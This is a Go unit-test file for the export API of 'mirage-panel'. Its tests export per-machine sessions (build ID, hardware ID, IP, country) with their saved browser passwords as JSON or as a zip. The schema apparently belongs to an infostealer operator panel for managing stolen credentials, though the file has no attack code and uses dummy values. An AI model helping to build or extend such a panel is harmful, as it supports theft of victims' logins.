package api_test

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"github.com/user/mirage-panel/internal/api"
)

func TestExport_SessionJSON(t *testing.T) {
	d := openTestDB(t)
	handler := api.NewExportHandler(d)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'build-1', 'hwid-001', 'win10', 'alice', '192.168.1.1', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES (?, ?, 'https://example.com', 'alice', 'secret123', 'chrome')`,
		uuid.New().String(), sid)
	if err != nil {
		t.Fatal(err)
	}

	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", handler.ExportSession)

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid+"?format=json", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	if w.Header().Get("Content-Type") != "application/json" {
		t.Errorf("Content-Type = %q, want application/json", w.Header().Get("Content-Type"))
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	if resp["id"] != sid {
		t.Errorf("expected id %s, got %v", sid, resp["id"])
	}
	if resp["os"] != "win10" {
		t.Errorf("expected os win10, got %v", resp["os"])
	}

	passwords := resp["passwords"].([]any)
	if len(passwords) != 1 {
		t.Fatalf("expected 1 password, got %d", len(passwords))
	}
	p := passwords[0].(map[string]any)
	if p["password_value"] != "secret123" {
		t.Errorf("expected password_value secret123, got %v", p["password_value"])
	}
	if p["url"] != "https://example.com" {
		t.Errorf("expected url https://example.com, got %v", p["url"])
	}
	if p["username"] != "alice" {
		t.Errorf("expected username alice, got %v", p["username"])
	}
}

func TestExport_NotFound(t *testing.T) {
	d := openTestDB(t)
	handler := api.NewExportHandler(d)

	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", handler.ExportSession)

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+uuid.New().String(), nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestExport_Bulk(t *testing.T) {
	d := openTestDB(t)
	handler := api.NewExportHandler(d)

	sid1 := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user1', '1.2.3.4', 'US', datetime('now'))`, sid1)
	if err != nil {
		t.Fatal(err)
	}

	sid2 := uuid.New().String()
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b2', 'hw2', 'win11', 'user2', '5.6.7.8', 'GB', datetime('now'))`, sid2)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES (?, ?, 'https://a.com', 'u1', 'p1', 'chrome')`, uuid.New().String(), sid1)
	if err != nil {
		t.Fatal(err)
	}

	body := `{"ids":["` + sid1 + `","` + sid2 + `"]}`
	req := httptest.NewRequest(http.MethodPost, "/", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	handler.ExportBulk(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	ct := w.Header().Get("Content-Type")
	if ct != "application/zip" {
		t.Errorf("Content-Type = %q, want application/zip", ct)
	}

	zr, err := zip.NewReader(bytes.NewReader(w.Body.Bytes()), int64(w.Body.Len()))
	if err != nil {
		t.Fatal(err)
	}

	if len(zr.File) != 2 {
		t.Fatalf("expected 2 files in zip, got %d", len(zr.File))
	}

	found := make(map[string]bool)
	for _, f := range zr.File {
		found[f.Name] = true
		rc, _ := f.Open()
		data, _ := io.ReadAll(rc)
		rc.Close()

		var session map[string]any
		if err := json.Unmarshal(data, &session); err != nil {
			t.Errorf("file %s: invalid JSON: %v", f.Name, err)
		}
		if session["id"] == "" {
			t.Errorf("file %s: missing session id", f.Name)
		}
	}

	if !found[sid1+".json"] {
		t.Errorf("missing %s.json in zip", sid1)
	}
	if !found[sid2+".json"] {
		t.Errorf("missing %s.json in zip", sid2)
	}
}
